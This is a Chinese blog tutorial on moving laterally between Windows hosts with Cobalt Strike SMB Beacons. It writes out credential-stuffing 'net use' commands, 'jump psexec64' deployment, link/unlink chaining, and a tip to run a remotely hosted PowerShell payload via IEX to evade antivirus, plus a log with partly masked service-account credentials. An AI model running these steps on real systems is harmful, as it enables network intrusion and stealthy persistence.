**2020/6/19更新：**

通过命名管道 psexec 通过 SMB Listener 横向过去的话，会在 `admin$` 共享路径下上传一个 exe 文件，这样可能过不了杀软。

![title](https://leanote.com/api/file/getImage?fileId=5eec8e06ab6441721300093b)

但是 SMB Beacon 可以生成 Stageless 的 PowerShell payload。

![title](https://leanote.com/api/file/getImage?fileId=5eec8e94ab644170190008d3)

如果把此 ps1 放到远程进行下载、IEX 执行就可以无文件绕过查杀，结合 https 监听器即可。

**谢谢 @undefined 师傅教我。**


-------------------------------


昨天一个朋友问我 SMB Beacon 怎么上线，我想在网上找篇文章给他没找到，于是自己写一篇。既然我写了那么多 CS 教程都忘了写这篇，也算是填个坑，可能你们 HW 时候用得到。


# 0x01 主机1 - 初始权限


- 主机1：`Windows 2008 R2 企业版 64位数中文版`

小声bb：为什么选这个做实验，因为它防护少。不像 2019 那么变态（默认开 defender），这样一会儿就要涉及免杀了。选 2008 做实验，省掉不少烦恼。再者，昨天我朋友遇到的真实环境也真的是 2008。我这几台主机上面防护软件就只有阿里云盾 `AliYunDun.exe`。


通过 `Scripted Web Delivery(powershell)` 生成的 payload 上线第一台主机，其 hostname 为 `father`。

![title](https://leanote.com/api/file/getImage?fileId=5eb9ff97ab64410531043e9a)

既然已经是 `Administrator` 权限，就省去了提权的步骤。


# 0x02 主机2 - SMB 上线

SMB Beacon 的使用场景是：

>Klion《CobatStrike 各个协议监听器及 payload 详细用法 》：<br/>
当前已拿到了目标内网中的一台机器的 beacon shell，然后又通过其它方式搞到了同内网下的另一台 windows 机器的本地 `administrator` 密码且这台机器的 SMB[445 端口]能正常通。不幸的是、由于各种各样的原因限制，<u>那台 windows 机器并不能正常访问外网</u>，也就是说没法再正常的反弹 beacon shell 了，那么其他那些反向监听器也就全都用不上了，而我现在就想通过当前仅有的这个 beacon shell 能不能把内网那台不能正常访问外网的机器也一块给带出来呢？答案是肯定的，`bind_pipe` 就是专为适应这种实战场景而设计的。

`注`：bind_pipe 是 CS SMB 协议 payload 的名字。


**1、探测内网 445 端口开放情况**

![title](https://leanote.com/api/file/getImage?fileId=5eba092cab6441030e0458a8)

![title](https://leanote.com/api/file/getImage?fileId=5eba098bab6441030e04598b)

探测结果如下:

![title](https://leanote.com/api/file/getImage?fileId=5eba09c3ab6441053104591b)

除了 hostname 为 `FATHER` 的这台主机，还有两台主机的 445 端口开放：

- 172.31.51.190（主机2：`Windows 2008 R2 企业版 64位数中文版`，hostname: `son`）
- 172.31.51.192（主机3：`Windows 2008 R2 企业版 64位数中文版`， hostname: `bro`）

先通过 SMB 协议使 190 主机上线：


**2、 创建一个 SMB listener**

![title](https://leanote.com/api/file/getImage?fileId=5eba0b00ab64410531045c0f)

- 监听器名称为 `smb`
- Pipename 管道名称为 `test`


可以注意到这个 SMB 监听器并没有让我们指定端口，其实 CS 3.14 之前是可以指定端口的，但是在 CS 4.0 中直接删掉了IP 和端口的填写框。这是因为这个 Beacon Shell 会通过管道过去，只要对方机器的 445 端口保持畅通，那么端口其实用不用都无所谓，至于 IP 保持默认即可。

**3、 使用欲横向主机的凭据填充令牌**

```
beacon> shell net use \\172.31.51.190\admin$ /user:"administrator" "test1234@" 
beacon> ls \\172.31.51.190\c$
```

![title](https://leanote.com/api/file/getImage?fileId=5eba0dfdab6441030e0464a8)

**4、 SMB 链接过去**

```
beacon> jump psexec64 172.31.51.190 smb
```

![title](https://leanote.com/api/file/getImage?fileId=5eba1413ab6441030e04743d)

![title](https://leanote.com/api/file/getImage?fileId=5eba1247ab6441030e046fa4)


这样就通过 SMB 协议成功横向到了 172.31.51.190 这台主机，获取了其 SMB Beacon！

# 0x03 主机3 - link 链接

对于主机3（`172.31.51.192`），我想从主机2 （`172.31.51.190`）走 SMB 协议横向过去。


**1、填充凭据**

现在还要上线 172.31.51.192 这台主机，这台主机同样开放了 445 端口，另外它和 172.31.51.189 的凭据相同，那么主机1就已经有其令牌了。



可以看到从 `172.31.51.189` 可以直接查看192这台主机的 c 盘文件：

![title](https://leanote.com/api/file/getImage?fileId=5eba15a5ab6441053104777d)

但是在 `172.31.51.190` 这台主机就不可以：

![title](https://leanote.com/api/file/getImage?fileId=5eba15d3ab644105310477ea)


这里注意一下这里的报错 `error 5`：

如果在尝试去连接到一个 Beacon 之后得到一个 error 5（权限拒绝），可以尝试这样解决： 窃取域用户的令牌或使用 `make_token DOMAIN\user password` 来使用对于目标有效的凭据来填充你的当前令牌，然后再次尝试去连接到 Beacon。


顺便提一句：`53` 错误是 445 端口不通，如下：

![title](https://leanote.com/api/file/getImage?fileId=5eba1910ab6441030e04819e)


填充凭据：

![title](https://leanote.com/api/file/getImage?fileId=5eba19c1ab644105310481dd)

>注：自行查询 ipc admin$。<br/>
![title](https://leanote.com/api/file/getImage?fileId=5eba1ff6ab644105310490ee)
<br/>
对于 `error 1312`的解决方法：[net use“发生系统错误 1312。指定的登录会话不存在。可能已被终止。”解决方法](https://www.cnblogs.com/dgjnszf/p/12792283.html)<br/>
![title](https://leanote.com/api/file/getImage?fileId=5eba22f4ab64410531049832)


**2、link SMB Beacon**


从 Beacon 控制台使用 `link [host] [Pipename]` 可以把当前的 Beacon 链接到一个<u>等待连接的 SMB Beacon</u>。当当前 Beacon check in，它的链接的对等 Beacon 也会 check in。

注：所谓的 `check in` ，指的是 Beacon 回连主机，回传受害系统的元数据，准备好进行任务数据通讯的状态。


注意上面的划线部分，什么叫「等待链接」？我们可以做个小实验来理解其概念。

在主机2（`172.31.51.190`）的 Beacon Shell 中填充完主机3（`172.31.51.192`）的凭据、获取了其 token 之后，我们来尝试一下 link 命令。如下图所示是失败的。

于是我们使用 `psexec` 命令从主机2（`172.31.51.190`）横向到主机3（`172.31.51.192`），于是就建立了主机2到主机3的链接：

![title](https://leanote.com/api/file/getImage?fileId=5eba1a4aab6441030e048463)



>[CS 官方手册 snowming 译本](https://blog.ateam.qianxin.com/CobaltStrike4.0%E7%94%A8%E6%88%B7%E6%89%8B%E5%86%8C_%E4%B8%AD%E6%96%87%E7%BF%BB%E8%AF%91.pdf)：<br/>
要销毁一个 Beacon 链接，在父会话或子会话中使用 `unlink [ip address] [session PID]` 。这个 [session PID] 参数是要取消链接的 Beacon 的进程 ID。该值用于当有多个子 Beacon 时，指定一个特定的 Beacon 来断开链接。



我们使用 `unlink 172.31.51.192 2520` 命令取消对主机3的链接：


![title](https://leanote.com/api/file/getImage?fileId=5eba1a86ab6441030e048504)


但是对主机3的 SMB Beacon 取消链接之后，发生了什么呢？

此 SMB Beacon 不会离开并消失。相反，它进入一种<u>等待其他 Beacon 连接</u>的状态。我们可以使用 link 命令来从将来的另一个 Beacon 恢复对 SMB Beacon 的控制。


于是再次尝试 link 命令，就成功了！

![title](https://leanote.com/api/file/getImage?fileId=5eba1acdab6441030e0485b9)


<u>所以总结一下：什么叫「等待链接」？</u>

<u>就是之前横向过获得了其 SMB Beacon，然后通过 `unlink` 命令取消了对此 SMB Beacon 的链接，之后这个被取消链接的 SMB Beacon 就处于等待链接状态。可以通过 `link` 命令再次链接。</u>



这里还有一些额外要补充的：

为了与正常流量融合，链接的 Beacon 使用 Windows 命名管道进行通信。这个流量被封装于 SMB 协议中。对于此方法有一些警告：

 1. 具有 SMB Beacon 的主机必须接受 445 端口上的连接。
 2. 只能链接由同一个 Cobalt Strike 实例管理的 Beacon。
 

# 0x04 总结

**SMB Beacon 使用场景：**

当前已拿到了目标内网中的一台机器的 beacon shell，然后又通过其它方式搞到了同内网下的另一台 windows 机器的本地 `administrator` 密码且这台机器的 SMB[445 端口]能正常 通。不幸的是、由于各种各样的原因限制，<u>那台 windows 机器并不能正常访问外网</u>，也就是说没法再正常的反弹 beacon shell 了，那么其他那些反向监听器也就全都用不上了，而我现在就想通过当前仅有的这个 beacon shell 能不能把内网那台不能正常访问外网的机器也一块给带出来呢？答案是肯定的，`bind_pipe` 就是专为适应这种实战场景而设计的。

**SMB Beacon 使用步骤：**
```
1. 建立 SMB 监听器
2. 填充凭据
beacon> shell net use \\172.31.51.190\admin$ /user:"administrator" "test1234@" #父 Beacon 中
3. 横向建立 SMB Beacon
beacon> jump psexec64 172.31.51.190 smb #父 Beacon 中
4. 取消链接
unlink [ip address] [session PID]
5. 再次链接到 SMB Beacon
link [host] [Pipename]
```

**最终效果展示：**

一个圈（我又加上了 hostname 为 bro 的 SMB Beacon 对 hostname 为 father 的 SMB Beacon 的一个级联链接）：

![title](https://leanote.com/api/file/getImage?fileId=5eba2425ab6441030e049c25)


多个级联：

![title](https://leanote.com/api/file/getImage?fileId=5eba2455ab64410531049b2d)


-----

**2020/6/11日更新：**


使用 SMB Beacon 的前提是凭据必须是 administrator 的。
我试过用域内的服务账户的凭据去 SMB 一台域内主机。如下面的记录，填充凭据没有问题，也可以列出目录。但是 jump psexec 横向时候就失败了。

```
beacon> shell net use \\192.168.0.134\C$ /user:"DT****\ir***ervice" "i*****123"
[*] Tasked beacon to run: net use \\192.168.0.134\C$ /user:"DTG***M\ir***ervice" "i*****123"
[+] host called home, sent: 101 bytes
[+] received output:
The command completed successfully.


# 注：这条命令的回显我省略了部分
beacon> ls \\192.168.0.134\C$
[*] Tasked beacon to list files in \\192.168.0.134\C$
[+] host called home, sent: 36 bytes
[*] Listing: \\192.168.0.134\C$\

 Size     Type    Last Modified         Name
 ----     ----    -------------         ----
          dir     05/17/2019 14:30:58   $Recycle.Bin
          dir     01/30/2013 21:18:26   Backup CA
          dir     01/14/2015 18:01:19   Backup Exec AOFO Store
       
beacon> jump psexec64 192.168.0.134 smb
[*] Tasked beacon to run windows/beacon_bind_pipe (\\.\pipe\msagent_98d5) on 192.168.0.134 via Service Control Manager (\\192.168.0.134\ADMIN$\773c614.exe)
[+] host called home, sent: 289492 bytes
[-] Could not open service control manager on 192.168.0.134: 5
[-] Could not connect to pipe: 2
```

![title](https://leanote.com/api/file/getImage?fileId=5ee211ddab644168ab000afc)


所以说必须是有了想要横向的那台主机的管理员权限才可以！！！


-------------------


# 参考文档：


1. CobatStrike 各个协议监听器及 payload 详细用法，Klion **[星球文章请勿向我索要]**
2. [CobaltStrike4.0用户手册_中文翻译](https://blog.ateam.qianxin.com/CobaltStrike4.0%E7%94%A8%E6%88%B7%E6%89%8B%E5%86%8C_%E4%B8%AD%E6%96%87%E7%BF%BB%E8%AF%91.pdf)，QAX-A TEAM